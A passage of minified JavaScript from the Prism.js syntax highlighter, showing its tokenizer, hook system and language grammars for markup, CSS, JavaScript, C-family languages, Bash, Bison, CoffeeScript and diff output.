g={element:w,language:c,grammar:y,code:w.textContent},q=function(a){g.highlightedCode=a,j.hooks.run("before-insert",g),g.element.innerHTML=g.highlightedCode,j.hooks.run("after-highlight",g),j.hooks.run("complete",g),p&&p.call(g.element)};if(j.hooks.run("before-sanity-check",g),g.code){if(j.hooks.run("before-highlight",g),g.grammar){if(x&&f.Worker){var z=new Worker(j.filename);z.onmessage=function(a){q(a.data)},z.postMessage(JSON.stringify({language:g.language,code:g.code,immediateClose:!0}))}else{q(j.highlight(g.code,g.grammar,g.language))}}else{q(j.util.encode(g.code))}}else{j.hooks.run("complete",g)}},highlight:function(o,c,p){var g={code:o,grammar:c,language:p};return j.hooks.run("before-tokenize",g),g.tokens=j.tokenize(g.code,g.grammar),j.hooks.run("after-tokenize",g),k.stringify(j.util.encode(g.tokens),g.language)},matchGrammar:function(ad,ah,U,K,M,Z,T){for(var W in U){if(U.hasOwnProperty(W)&&U[W]){if(W==T){return}var L=U[W];L="Array"===j.util.type(L)?L:[L];for(var ab=0;ab<L.length;++ab){var af=L[ab],I=af.inside,aa=!!af.lookbehind,ac=!!af.greedy,ae=0,V=af.alias;if(ac&&!af.pattern.global){var R=af.pattern.toString().match(/[imuy]*$/)[0];af.pattern=RegExp(af.pattern.source,R+"g")}af=af.pattern||af;for(var D=K,H=M;D<ah.length;H+=ah[D].length,++D){var X=ah[D];if(ah.length>ad.length){return}if(!(X instanceof k)){if(ac&&D!=ah.length-1){if(af.lastIndex=H,!(F=af.exec(ad))){break}for(var ag=F.index+(aa?F[1].length:0),G=F.index+F[0].length,Q=D,z=H,B=ah.length;Q<B&&(z<G||!ah[Q].type&&!ah[Q-1].greedy);++Q){(z+=ah[Q].length)<=ag&&(++D,H=z)}if(ah[D] instanceof k){continue}C=Q-D,X=ad.slice(H,z),F.index-=H}else{af.lastIndex=0;var F=af.exec(X),C=1}if(F){aa&&(ae=F[1]?F[1].length:0);G=(ag=F.index+ae)+(F=F[0].slice(ae)).length;var Y=X.slice(0,ag),q=X.slice(G),J=[D,C];Y&&(++D,H+=Y.length,J.push(Y));var ai=new k(W,I?j.tokenize(F,I):F,V,F,ac);if(J.push(ai),q&&J.push(q),Array.prototype.splice.apply(ah,J),1!=C&&j.matchGrammar(ad,ah,U,D,H,!0,W),Z){break}}else{if(Z){break}}}}}}}},tokenize:function(p,c){var q=[p],g=c.rest;if(g){for(var o in g){c[o]=g[o]}delete c.rest}return j.matchGrammar(p,q,c,0,0,!1),q},hooks:{all:{},add:function(g,c){var o=j.hooks.all;o[g]=o[g]||[],o[g].push(c)},run:function(p,c){var q=j.hooks.all[p];if(q&&q.length){for(var g,o=0;g=q[o++];){g(c)}}}},Token:k};function k(p,c,q,g,o){this.type=p,this.content=c,this.alias=q,this.length=0|(g||"").length,this.greedy=!!o}if(f.Prism=j,k.stringify=function(p,c){if("string"==typeof p){return p}if(Array.isArray(p)){return p.map(function(a){return k.stringify(a,c)}).join("")}var q={type:p.type,content:k.stringify(p.content,c),tag:"span",classes:["token",p.type],attributes:{},language:c};if(p.alias){var g=Array.isArray(p.alias)?p.alias:[p.alias];Array.prototype.push.apply(q.classes,g)}j.hooks.run("wrap",q);var o=Object.keys(q.attributes).map(function(a){return a+'="'+(q.attributes[a]||"").replace(/"/g,"&quot;")+'"'}).join(" ");return"<"+q.tag+' class="'+q.classes.join(" ")+'"'+(o?" "+o:"")+">"+q.content+"</"+q.tag+">"},!f.document){return f.addEventListener&&(j.disableWorkerMessageHandler||f.addEventListener("message",function(p){var c=JSON.parse(p.data),q=c.language,g=c.code,o=c.immediateClose;f.postMessage(j.highlight(g,j.languages[q],q)),o&&f.close()},!1)),j}var h=document.currentScript||[].slice.call(document.getElementsByTagName("script")).pop();return h&&(j.filename=h.src,j.manual||h.hasAttribute("data-manual")||("loading"!==document.readyState?window.requestAnimationFrame?window.requestAnimationFrame(j.highlightAll):window.setTimeout(j.highlightAll,16):document.addEventListener("DOMContentLoaded",j.highlightAll))),j}(_self);"undefined"!=typeof module&&module.exports&&(module.exports=Prism),"undefined"!=typeof global&&(global.Prism=Prism);Prism.languages.markup={comment:/<!--[\s\S]*?-->/,prolog:/<\?[\s\S]+?\?>/,doctype:/<!DOCTYPE[\s\S]+?>/i,cdata:/<!\[CDATA\[[\s\S]*?]]>/i,tag:{pattern:/<\/?(?!\d)[^\s>\/=$<%]+(?:\s(?:\s*[^\s>\/=]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s'">=]+(?=[\s>]))|(?=[\s/>])))+)?\s*\/?>/i,greedy:!0,inside:{tag:{pattern:/^<\/?[^\s>\/]+/i,inside:{punctuation:/^<\/?/,namespace:/^[^\s>\/:]+:/}},"attr-value":{pattern:/=\s*(?:"[^"]*"|'[^']*'|[^\s'">=]+)/i,inside:{punctuation:[/^=/,{pattern:/^(\s*)["']|["']$/,lookbehind:!0}]}},punctuation:/\/?>/,"attr-name":{pattern:/[^\s>\/]+/,inside:{namespace:/^[^\s>\/:]+:/}}}},entity:/&#?[\da-z]{1,8};/i},Prism.languages.markup.tag.inside["attr-value"].inside.entity=Prism.languages.markup.entity,Prism.hooks.add("wrap",function(b){"entity"===b.type&&(b.attributes.title=b.content.replace(/&amp;/,"&"))}),Object.defineProperty(Prism.languages.markup.tag,"addInlined",{value:function(b,g){var f={};f["language-"+g]={pattern:/(^<!\[CDATA\[)[\s\S]+?(?=\]\]>$)/i,lookbehind:!0,inside:Prism.languages[g]},f.cdata=/^<!\[CDATA\[|\]\]>$/i;var h={"included-cdata":{pattern:/<!\[CDATA\[[\s\S]*?\]\]>/i,inside:f}};h["language-"+g]={pattern:/[\s\S]+/,inside:Prism.languages[g]};var c={};c[b]={pattern:RegExp("(<__[\\s\\S]*?>)(?:<!\\[CDATA\\[[\\s\\S]*?\\]\\]>\\s*|[\\s\\S])*?(?=<\\/__>)".replace(/__/g,b),"i"),lookbehind:!0,greedy:!0,inside:h},Prism.languages.insertBefore("markup","cdata",c)}}),Prism.languages.xml=Prism.languages.extend("markup",{}),Prism.languages.html=Prism.languages.markup,Prism.languages.mathml=Prism.languages.markup,Prism.languages.svg=Prism.languages.markup;!function(b){var a=/("|')(?:\\(?:\r\n|[\s\S])|(?!\1)[^\\\r\n])*\1/;b.languages.css={comment:/\/\*[\s\S]*?\*\//,atrule:{pattern:/@[\w-]+[\s\S]*?(?:;|(?=\s*\{))/,inside:{rule:/@[\w-]+/}},url:{pattern:RegExp("url\\((?:"+a.source+"|[^\n\r()]*)\\)","i"),inside:{"function":/^url/i,punctuation:/^\(|\)$/}},selector:RegExp("[^{}\\s](?:[^{};\"']|"+a.source+")*?(?=\\s*\\{)"),string:{pattern:a,greedy:!0},property:/[-_a-z\xA0-\uFFFF][-\w\xA0-\uFFFF]*(?=\s*:)/i,important:/!important\b/i,"function":/[-a-z0-9]+(?=\()/i,punctuation:/[(){};:,]/},b.languages.css.atrule.inside.rest=b.languages.css;var c=b.languages.markup;c&&(c.tag.addInlined("style","css"),b.languages.insertBefore("inside","attr-value",{"style-attr":{pattern:/\s*style=("|')(?:\\[\s\S]|(?!\1)[^\\])*\1/i,inside:{"attr-name":{pattern:/^\s*style/i,inside:c.tag.inside},punctuation:/^\s*=\s*['"]|['"]\s*$/,"attr-value":{pattern:/.+/i,inside:b.languages.css}},alias:"language-css"}},c.tag))}(Prism);Prism.languages.clike={comment:[{pattern:/(^|[^\\])\/\*[\s\S]*?(?:\*\/|$)/,lookbehind:!0},{pattern:/(^|[^\\:])\/\/.*/,lookbehind:!0,greedy:!0}],string:{pattern:/(["'])(?:\\(?:\r\n|[\s\S])|(?!\1)[^\\\r\n])*\1/,greedy:!0},"class-name":{pattern:/((?:\b(?:class|interface|extends|implements|trait|instanceof|new)\s+)|(?:catch\s+\())[\w.\\]+/i,lookbehind:!0,inside:{punctuation:/[.\\]/}},keyword:/\b(?:if|else|while|do|for|return|in|instanceof|function|new|try|throw|catch|finally|null|break|continue)\b/,"boolean":/\b(?:true|false)\b/,"function":/\w+(?=\()/,number:/\b0x[\da-f]+\b|(?:\b\d+\.?\d*|\B\.\d+)(?:e[+-]?\d+)?/i,operator:/--?|\+\+?|!=?=?|<=?|>=?|==?=?|&&?|\|\|?|\?|\*|\/|~|\^|%/,punctuation:/[{}[\];(),.:]/};Prism.languages.javascript=Prism.languages.extend("clike",{"class-name":[Prism.languages.clike["class-name"],{pattern:/(^|[^$\w\xA0-\uFFFF])[_$A-Z\xA0-\uFFFF][$\w\xA0-\uFFFF]*(?=\.(?:prototype|constructor))/,lookbehind:!0}],keyword:[{pattern:/((?:^|})\s*)(?:catch|finally)\b/,lookbehind:!0},{pattern:/(^|[^.])\b(?:as|async(?=\s*(?:function\b|\(|[$\w\xA0-\uFFFF]|$))|await|break|case|class|const|continue|debugger|default|delete|do|else|enum|export|extends|for|from|function|get|if|implements|import|in|instanceof|interface|let|new|null|of|package|private|protected|public|return|set|static|super|switch|this|throw|try|typeof|undefined|var|void|while|with|yield)\b/,lookbehind:!0}],number:/\b(?:(?:0[xX](?:[\dA-Fa-f](?:_[\dA-Fa-f])?)+|0[bB](?:[01](?:_[01])?)+|0[oO](?:[0-7](?:_[0-7])?)+)n?|(?:\d(?:_\d)?)+n|NaN|Infinity)\b|(?:\b(?:\d(?:_\d)?)+\.?(?:\d(?:_\d)?)*|\B\.(?:\d(?:_\d)?)+)(?:[Ee][+-]?(?:\d(?:_\d)?)+)?/,"function":/#?[_$a-zA-Z\xA0-\uFFFF][$\w\xA0-\uFFFF]*(?=\s*(?:\.\s*(?:apply|bind|call)\s*)?\()/,operator:/-[-=]?|\+[+=]?|!=?=?|<<?=?|>>?>?=?|=(?:==?|>)?|&[&=]?|\|[|=]?|\*\*?=?|\/=?|~|\^=?|%=?|\?|\.{3}/}),Prism.languages.javascript["class-name"][0].pattern=/(\b(?:class|interface|extends|implements|instanceof|new)\s+)[\w.\\]+/,Prism.languages.insertBefore("javascript","keyword",{regex:{pattern:/((?:^|[^$\w\xA0-\uFFFF."'\])\s])\s*)\/(\[(?:[^\]\\\r\n]|\\.)*]|\\.|[^/\\\[\r\n])+\/[gimyus]{0,6}(?=\s*($|[\r\n,.;})\]]))/,lookbehind:!0,greedy:!0},"function-variable":{pattern:/#?[_$a-zA-Z\xA0-\uFFFF][$\w\xA0-\uFFFF]*(?=\s*[=:]\s*(?:async\s*)?(?:\bfunction\b|(?:\((?:[^()]|\([^()]*\))*\)|[_$a-zA-Z\xA0-\uFFFF][$\w\xA0-\uFFFF]*)\s*=>))/,alias:"function"},parameter:[{pattern:/(function(?:\s+[_$A-Za-z\xA0-\uFFFF][$\w\xA0-\uFFFF]*)?\s*\(\s*)(?!\s)(?:[^()]|\([^()]*\))+?(?=\s*\))/,lookbehind:!0,inside:Prism.languages.javascript},{pattern:/[_$a-z\xA0-\uFFFF][$\w\xA0-\uFFFF]*(?=\s*=>)/i,inside:Prism.languages.javascript},{pattern:/(\(\s*)(?!\s)(?:[^()]|\([^()]*\))+?(?=\s*\)\s*=>)/,lookbehind:!0,inside:Prism.languages.javascript},{pattern:/((?:\b|\s|^)(?!(?:as|async|await|break|case|catch|class|const|continue|debugger|default|delete|do|else|enum|export|extends|finally|for|from|function|get|if|implements|import|in|instanceof|interface|let|new|null|of|package|private|protected|public|return|set|static|super|switch|this|throw|try|typeof|undefined|var|void|while|with|yield)(?![$\w\xA0-\uFFFF]))(?:[_$A-Za-z\xA0-\uFFFF][$\w\xA0-\uFFFF]*\s*)\(\s*)(?!\s)(?:[^()]|\([^()]*\))+?(?=\s*\)\s*\{)/,lookbehind:!0,inside:Prism.languages.javascript}],constant:/\b[A-Z](?:[A-Z_]|\dx?)*\b/}),Prism.languages.insertBefore("javascript","string",{"template-string":{pattern:/`(?:\\[\s\S]|\${(?:[^{}]|{(?:[^{}]|{[^}]*})*})+}|(?!\${)[^\\`])*`/,greedy:!0,inside:{"template-punctuation":{pattern:/^`|`$/,alias:"string"},interpolation:{pattern:/((?:^|[^\\])(?:\\{2})*)\${(?:[^{}]|{(?:[^{}]|{[^}]*})*})+}/,lookbehind:!0,inside:{"interpolation-punctuation":{pattern:/^\${|}$/,alias:"punctuation"},rest:Prism.languages.javascript}},string:/[\s\S]+/}}}),Prism.languages.markup&&Prism.languages.markup.tag.addInlined("script","javascript"),Prism.languages.js=Prism.languages.javascript;Prism.languages.apl={comment:/(?:⍝|#[! ]).*$/m,string:{pattern:/'(?:[^'\r\n]|'')*'/,greedy:!0},number:/¯?(?:\d*\.?\d+(?:e[+¯]?\d+)?|¯|∞)(?:j¯?(?:\d*\.?\d+(?:e[+¯]?\d+)?|¯|∞))?/i,statement:/:[A-Z][a-z][A-Za-z]*\b/,"system-function":{pattern:/⎕[A-Z]+/i,alias:"function"},constant:/[⍬⌾#⎕⍞]/,"function":/[-+×÷⌈⌊∣|⍳⍸?*⍟○!⌹<≤=>≥≠≡≢∊⍷∪∩~∨∧⍱⍲⍴,⍪⌽⊖⍉↑↓⊂⊃⊆⊇⌷⍋⍒⊤⊥⍕⍎⊣⊢⍁⍂≈⍯↗¤→]/,"monadic-operator":{pattern:/[\\\/⌿⍀¨⍨⌶&∥]/,alias:"operator"},"dyadic-operator":{pattern:/[.⍣⍠⍤∘⌸@⌺]/,alias:"operator"},assignment:{pattern:/←/,alias:"keyword"},punctuation:/[\[;\]()◇⋄]/,dfn:{pattern:/[{}⍺⍵⍶⍹∇⍫:]/,alias:"builtin"}};Prism.languages.c=Prism.languages.extend("clike",{"class-name":{pattern:/(\b(?:enum|struct)\s+)\w+/,lookbehind:!0},keyword:/\b(?:_Alignas|_Alignof|_Atomic|_Bool|_Complex|_Generic|_Imaginary|_Noreturn|_Static_assert|_Thread_local|asm|typeof|inline|auto|break|case|char|const|continue|default|do|double|else|enum|extern|float|for|goto|if|int|long|register|return|short|signed|sizeof|static|struct|switch|typedef|union|unsigned|void|volatile|while)\b/,operator:/>>=?|<<=?|->|([-+&|:])\1|[?:~]|[-+*/%&|^!=<>]=?/,number:/(?:\b0x(?:[\da-f]+\.?[\da-f]*|\.[\da-f]+)(?:p[+-]?\d+)?|(?:\b\d+\.?\d*|\B\.\d+)(?:e[+-]?\d+)?)[ful]*/i}),Prism.languages.insertBefore("c","string",{macro:{pattern:/(^\s*)#\s*[a-z]+(?:[^\r\n\\]|\\(?:\r\n|[\s\S]))*/im,lookbehind:!0,alias:"property",inside:{string:{pattern:/(#\s*include\s*)(?:<.+?>|("|')(?:\\?.)+?\2)/,lookbehind:!0},directive:{pattern:/(#\s*)\b(?:define|defined|elif|else|endif|error|ifdef|ifndef|if|import|include|line|pragma|undef|using)\b/,lookbehind:!0,alias:"keyword"}}},constant:/\b(?:__FILE__|__LINE__|__DATE__|__TIME__|__TIMESTAMP__|__func__|EOF|NULL|SEEK_CUR|SEEK_END|SEEK_SET|stdin|stdout|stderr)\b/}),delete Prism.languages.c["boolean"];Prism.languages.csharp=Prism.languages.extend("clike",{keyword:/\b(?:abstract|add|alias|as|ascending|async|await|base|bool|break|byte|case|catch|char|checked|class|const|continue|decimal|default|delegate|descending|do|double|dynamic|else|enum|event|explicit|extern|false|finally|fixed|float|for|foreach|from|get|global|goto|group|if|implicit|in|int|interface|internal|into|is|join|let|lock|long|namespace|new|null|object|operator|orderby|out|override|params|partial|private|protected|public|readonly|ref|remove|return|sbyte|sealed|select|set|short|sizeof|stackalloc|static|string|struct|switch|this|throw|true|try|typeof|uint|ulong|unchecked|unsafe|ushort|using|value|var|virtual|void|volatile|where|while|yield)\b/,string:[{pattern:/@("|')(?:\1\1|\\[\s\S]|(?!\1)[^\\])*\1/,greedy:!0},{pattern:/("|')(?:\\.|(?!\1)[^\\\r\n])*?\1/,greedy:!0}],"class-name":[{pattern:/\b[A-Z]\w*(?:\.\w+)*\b(?=\s+\w+)/,inside:{punctuation:/\./}},{pattern:/(\[)[A-Z]\w*(?:\.\w+)*\b/,lookbehind:!0,inside:{punctuation:/\./}},{pattern:/(\b(?:class|interface)\s+[A-Z]\w*(?:\.\w+)*\s*:\s*)[A-Z]\w*(?:\.\w+)*\b/,lookbehind:!0,inside:{punctuation:/\./}},{pattern:/((?:\b(?:class|interface|new)\s+)|(?:catch\s+\())[A-Z]\w*(?:\.\w+)*\b/,lookbehind:!0,inside:{punctuation:/\./}}],number:/\b0x[\da-f]+\b|(?:\b\d+\.?\d*|\B\.\d+)f?/i,operator:/>>=?|<<=?|[-=]>|([-+&|?])\1|~|[-+*/%&|^!=<>]=?/,punctuation:/\?\.?|::|[{}[\];(),.:]/}),Prism.languages.insertBefore("csharp","class-name",{"generic-method":{pattern:/\w+\s*<[^>\r\n]+?>\s*(?=\()/,inside:{"function":/^\w+/,"class-name":{pattern:/\b[A-Z]\w*(?:\.\w+)*\b/,inside:{punctuation:/\./}},keyword:Prism.languages.csharp.keyword,punctuation:/[<>(),.:]/}},preprocessor:{pattern:/(^\s*)#.*/m,lookbehind:!0,alias:"property",inside:{directive:{pattern:/(\s*#)\b(?:define|elif|else|endif|endregion|error|if|line|pragma|region|undef|warning)\b/,lookbehind:!0,alias:"keyword"}}}}),Prism.languages.dotnet=Prism.languages.cs=Prism.languages.csharp;!function(h){var c="\\b(?:BASH|BASHOPTS|BASH_ALIASES|BASH_ARGC|BASH_ARGV|BASH_CMDS|BASH_COMPLETION_COMPAT_DIR|BASH_LINENO|BASH_REMATCH|BASH_SOURCE|BASH_VERSINFO|BASH_VERSION|COLORTERM|COLUMNS|COMP_WORDBREAKS|DBUS_SESSION_BUS_ADDRESS|DEFAULTS_PATH|DESKTOP_SESSION|DIRSTACK|DISPLAY|EUID|GDMSESSION|GDM_LANG|GNOME_KEYRING_CONTROL|GNOME_KEYRING_PID|GPG_AGENT_INFO|GROUPS|HISTCONTROL|HISTFILE|HISTFILESIZE|HISTSIZE|HOME|HOSTNAME|HOSTTYPE|IFS|INSTANCE|JOB|LANG|LANGUAGE|LC_ADDRESS|LC_ALL|LC_IDENTIFICATION|LC_MEASUREMENT|LC_MONETARY|LC_NAME|LC_NUMERIC|LC_PAPER|LC_TELEPHONE|LC_TIME|LESSCLOSE|LESSOPEN|LINES|LOGNAME|LS_COLORS|MACHTYPE|MAILCHECK|MANDATORY_PATH|NO_AT_BRIDGE|OLDPWD|OPTERR|OPTIND|ORBIT_SOCKETDIR|OSTYPE|PAPERSIZE|PATH|PIPESTATUS|PPID|PS1|PS2|PS3|PS4|PWD|RANDOM|REPLY|SECONDS|SELINUX_INIT|SESSION|SESSIONTYPE|SESSION_MANAGER|SHELL|SHELLOPTS|SHLVL|SSH_AUTH_SOCK|TERM|UID|UPSTART_EVENTS|UPSTART_INSTANCE|UPSTART_JOB|UPSTART_SESSION|USER|WINDOWID|XAUTHORITY|XDG_CONFIG_DIRS|XDG_CURRENT_DESKTOP|XDG_DATA_DIRS|XDG_GREETER_DATA_DIR|XDG_MENU_PREFIX|XDG_RUNTIME_DIR|XDG_SEAT|XDG_SEAT_PATH|XDG_SESSION_DESKTOP|XDG_SESSION_ID|XDG_SESSION_PATH|XDG_SESSION_TYPE|XDG_VTNR|XMODIFIERS)\\b",j={environment:{pattern:RegExp("\\$"+c),alias:"constant"},variable:[{pattern:/\$?\(\([\s\S]+?\)\)/,greedy:!0,inside:{variable:[{pattern:/(^\$\(\([\s\S]+)\)\)/,lookbehind:!0},/^\$\(\(/],number:/\b0x[\dA-Fa-f]+\b|(?:\b\d+\.?\d*|\B\.\d+)(?:[Ee]-?\d+)?/,operator:/--?|-=|\+\+?|\+=|!=?|~|\*\*?|\*=|\/=?|%=?|<<=?|>>=?|<=?|>=?|==?|&&?|&=|\^=?|\|\|?|\|=|\?|:/,punctuation:/\(\(?|\)\)?|,|;/}},{pattern:/\$\((?:\([^)]+\)|[^()])+\)|`[^`]+`/,greedy:!0,inside:{variable:/^\$\(|^`|\)$|`$/}},{pattern:/\$\{[^}]+\}/,greedy:!0,inside:{operator:/:[-=?+]?|[!\/]|##?|%%?|\^\^?|,,?/,punctuation:/[\[\]]/,environment:{pattern:RegExp("(\\{)"+c),lookbehind:!0,alias:"constant"}}},/\$(?:\w+|[#?*!@$])/],entity:/\\(?:[abceEfnrtv\\"]|O?[0-7]{1,3}|x[0-9a-fA-F]{1,2}|u[0-9a-fA-F]{4}|U[0-9a-fA-F]{8})/};h.languages.bash={shebang:{pattern:/^#!\s*\/.*/,alias:"important"},comment:{pattern:/(^|[^"{\\$])#.*/,lookbehind:!0},"function-name":[{pattern:/(\bfunction\s+)\w+(?=(?:\s*\(?:\s*\))?\s*\{)/,lookbehind:!0,alias:"function"},{pattern:/\b\w+(?=\s*\(\s*\)\s*\{)/,alias:"function"}],"for-or-select":{pattern:/(\b(?:for|select)\s+)\w+(?=\s+in\s)/,alias:"variable",lookbehind:!0},"assign-left":{pattern:/(^|[\s;|&]|[<>]\()\w+(?=\+?=)/,inside:{environment:{pattern:RegExp("(^|[\\s;|&]|[<>]\\()"+c),lookbehind:!0,alias:"constant"}},alias:"variable",lookbehind:!0},string:[{pattern:/((?:^|[^<])<<-?\s*)(\w+?)\s*(?:\r?\n|\r)(?:[\s\S])*?(?:\r?\n|\r)\2/,lookbehind:!0,greedy:!0,inside:j},{pattern:/((?:^|[^<])<<-?\s*)(["'])(\w+)\2\s*(?:\r?\n|\r)(?:[\s\S])*?(?:\r?\n|\r)\3/,lookbehind:!0,greedy:!0},{pattern:/(["'])(?:\\[\s\S]|\$\([^)]+\)|`[^`]+`|(?!\1)[^\\])*\1/,greedy:!0,inside:j}],environment:{pattern:RegExp("\\$?"+c),alias:"constant"},variable:j.variable,"function":{pattern:/(^|[\s;|&]|[<>]\()(?:add|apropos|apt|aptitude|apt-cache|apt-get|aspell|automysqlbackup|awk|basename|bash|bc|bconsole|bg|bzip2|cal|cat|cfdisk|chgrp|chkconfig|chmod|chown|chroot|cksum|clear|cmp|column|comm|cp|cron|crontab|csplit|curl|cut|date|dc|dd|ddrescue|debootstrap|df|diff|diff3|dig|dir|dircolors|dirname|dirs|dmesg|du|egrep|eject|env|ethtool|expand|expect|expr|fdformat|fdisk|fg|fgrep|file|find|fmt|fold|format|free|fsck|ftp|fuser|gawk|git|gparted|grep|groupadd|groupdel|groupmod|groups|grub-mkconfig|gzip|halt|head|hg|history|host|hostname|htop|iconv|id|ifconfig|ifdown|ifup|import|install|ip|jobs|join|kill|killall|less|link|ln|locate|logname|logrotate|look|lpc|lpr|lprint|lprintd|lprintq|lprm|ls|lsof|lynx|make|man|mc|mdadm|mkconfig|mkdir|mke2fs|mkfifo|mkfs|mkisofs|mknod|mkswap|mmv|more|most|mount|mtools|mtr|mutt|mv|nano|nc|netstat|nice|nl|nohup|notify-send|npm|nslookup|op|open|parted|passwd|paste|pathchk|ping|pkill|pnpm|popd|pr|printcap|printenv|ps|pushd|pv|quota|quotacheck|quotactl|ram|rar|rcp|reboot|remsync|rename|renice|rev|rm|rmdir|rpm|rsync|scp|screen|sdiff|sed|sendmail|seq|service|sftp|sh|shellcheck|shuf|shutdown|sleep|slocate|sort|split|ssh|stat|strace|su|sudo|sum|suspend|swapon|sync|tac|tail|tar|tee|time|timeout|top|touch|tr|traceroute|tsort|tty|umount|uname|unexpand|uniq|units|unrar|unshar|unzip|update-grub|uptime|useradd|userdel|usermod|users|uudecode|uuencode|v|vdir|vi|vim|virsh|vmstat|wait|watch|wc|wget|whereis|which|who|whoami|write|xargs|xdg-open|yarn|yes|zenity|zip|zsh|zypper)(?=$|[)\s;|&])/,lookbehind:!0},keyword:{pattern:/(^|[\s;|&]|[<>]\()(?:if|then|else|elif|fi|for|while|in|case|esac|function|select|do|done|until)(?=$|[)\s;|&])/,lookbehind:!0},builtin:{pattern:/(^|[\s;|&]|[<>]\()(?:\.|:|break|cd|continue|eval|exec|exit|export|getopts|hash|pwd|readonly|return|shift|test|times|trap|umask|unset|alias|bind|builtin|caller|command|declare|echo|enable|help|let|local|logout|mapfile|printf|read|readarray|source|type|typeset|ulimit|unalias|set|shopt)(?=$|[)\s;|&])/,lookbehind:!0,alias:"class-name"},"boolean":{pattern:/(^|[\s;|&]|[<>]\()(?:true|false)(?=$|[)\s;|&])/,lookbehind:!0},"file-descriptor":{pattern:/\B&\d\b/,alias:"important"},operator:{pattern:/\d?<>|>\||\+=|==?|!=?|=~|<<[<-]?|[&\d]?>>|\d?[<>]&?|&[>&]?|\|[&|]?|<=?|>=?/,inside:{"file-descriptor":{pattern:/^\d/,alias:"important"}}},punctuation:/\$?\(\(?|\)\)?|\.\.|[{}[\];\\]/,number:{pattern:/(^|\s)(?:[1-9]\d*|0)(?:[.,]\d+)?\b/,lookbehind:!0}};for(var b=["comment","function-name","for-or-select","assign-left","string","environment","function","keyword","builtin","boolean","file-descriptor","operator","punctuation","number"],g=j.variable[1].inside,f=0;f<b.length;f++){g[b[f]]=h.languages.bash[b[f]]}h.languages.shell=h.languages.bash}(Prism);Prism.languages.bison=Prism.languages.extend("c",{}),Prism.languages.insertBefore("bison","comment",{bison:{pattern:/^[\s\S]*?%%[\s\S]*?%%/,inside:{c:{pattern:/%\{[\s\S]*?%\}|\{(?:\{[^}]*\}|[^{}])*\}/,inside:{delimiter:{pattern:/^%?\{|%?\}$/,alias:"punctuation"},"bison-variable":{pattern:/[$@](?:<[^\s>]+>)?[\w$]+/,alias:"variable",inside:{punctuation:/<|>/}},rest:Prism.languages.c}},comment:Prism.languages.c.comment,string:Prism.languages.c.string,property:/\S+(?=:)/,keyword:/%\w+/,number:{pattern:/(^|[^@])\b(?:0x[\da-f]+|\d+)/i,lookbehind:!0},punctuation:/%[%?]|[|:;\[\]<>]/}}});Prism.languages.cpp=Prism.languages.extend("c",{"class-name":{pattern:/(\b(?:class|enum|struct)\s+)\w+/,lookbehind:!0},keyword:/\b(?:alignas|alignof|asm|auto|bool|break|case|catch|char|char16_t|char32_t|class|compl|const|constexpr|const_cast|continue|decltype|default|delete|do|double|dynamic_cast|else|enum|explicit|export|extern|float|for|friend|goto|if|inline|int|int8_t|int16_t|int32_t|int64_t|uint8_t|uint16_t|uint32_t|uint64_t|long|mutable|namespace|new|noexcept|nullptr|operator|private|protected|public|register|reinterpret_cast|return|short|signed|sizeof|static|static_assert|static_cast|struct|switch|template|this|thread_local|throw|try|typedef|typeid|typename|union|unsigned|using|virtual|void|volatile|wchar_t|while)\b/,number:{pattern:/(?:\b0b[01']+|\b0x(?:[\da-f']+\.?[\da-f']*|\.[\da-f']+)(?:p[+-]?[\d']+)?|(?:\b[\d']+\.?[\d']*|\B\.[\d']+)(?:e[+-]?[\d']+)?)[ful]*/i,greedy:!0},operator:/>>=?|<<=?|->|([-+&|:])\1|[?:~]|[-+*/%&|^!=<>]=?|\b(?:and|and_eq|bitand|bitor|not|not_eq|or|or_eq|xor|xor_eq)\b/,"boolean":/\b(?:true|false)\b/}),Prism.languages.insertBefore("cpp","string",{"raw-string":{pattern:/R"([^()\\ ]{0,16})\([\s\S]*?\)\1"/,alias:"string",greedy:!0}});!function(b){var a=/#(?!\{).+/,c={pattern:/#\{[^}]+\}/,alias:"variable"};b.languages.coffeescript=b.languages.extend("javascript",{comment:a,string:[{pattern:/'(?:\\[\s\S]|[^\\'])*'/,greedy:!0},{pattern:/"(?:\\[\s\S]|[^\\"])*"/,greedy:!0,inside:{interpolation:c}}],keyword:/\b(?:and|break|by|catch|class|continue|debugger|delete|do|each|else|extend|extends|false|finally|for|if|in|instanceof|is|isnt|let|loop|namespace|new|no|not|null|of|off|on|or|own|return|super|switch|then|this|throw|true|try|typeof|undefined|unless|until|when|while|window|with|yes|yield)\b/,"class-member":{pattern:/@(?!\d)\w+/,alias:"variable"}}),b.languages.insertBefore("coffeescript","comment",{"multiline-comment":{pattern:/###[\s\S]+?###/,alias:"comment"},"block-regex":{pattern:/\/{3}[\s\S]*?\/{3}/,alias:"regex",inside:{comment:a,interpolation:c}}}),b.languages.insertBefore("coffeescript","string",{"inline-javascript":{pattern:/`(?:\\[\s\S]|[^\\`])*`/,inside:{delimiter:{pattern:/^`|`$/,alias:"punctuation"},rest:b.languages.javascript}},"multiline-string":[{pattern:/'''[\s\S]*?'''/,greedy:!0,alias:"string"},{pattern:/"""[\s\S]*?"""/,greedy:!0,alias:"string",inside:{interpolation:c}}]}),b.languages.insertBefore("coffeescript","keyword",{property:/(?!\d)\w+(?=\s*:(?!:))/}),delete b.languages.coffeescript["template-string"],b.languages.coffee=b.languages.coffeescript}(Prism);!function(b){b.languages.diff={coord:[/^(?:\*{3}|-{3}|\+{3}).*$/m,/^@@.*@@$/m,/^\d+.*$/m]};var a={"deleted-sign":"-","deleted-arrow":"<","inserted-sign":"+","inserted-arrow":">",unchanged:" ",diff:"!"};Object.keys(a).forEach(function(f){var g=a[f],c=[];/^\w+$/.test(f)||c.push(/\w+/.exec(f)[0]),"diff"===f&&c.push("bold"),b.languages.diff[f]={pattern:RegExp("^(?:["+g+"].*(?:\r\n?|\n|(?![\\s\\S])))+","m"),alias:c}}),Object.defineProperty(b.languages.diff,"PREFIXES",{value:a})}(Prism);!function(b){function a(c,f){return"___"+c.toUpperCase()+f+"___"}Object.defineProperties(b.languages["markup-templating"]={},{buildPlaceholders:{value:function(f,g,h,j){if(f.language===g){var k=f.tokenStack=[];f.code=f.code.replace(h,function(l){if("function"==typeof j&&!j(l)){return l}for(var m,c=k.length;-1!==f.code.indexOf(m=a(g,c));){++c}return k[c]=l,m}),f.grammar=b.languages.markup}}},tokenizePlaceholders:{value:function(h,f){if(h.language===f&&h.tokenStack){h.grammar=b.languages[f];var c=0,j=Object.keys(h.tokenStack);!function g(m){for(var B=0;B<m.length&&!(c>=j.length);B++){var z=m[B];if("string"==typeof z||z.content&&"string"==typeof z.content){var 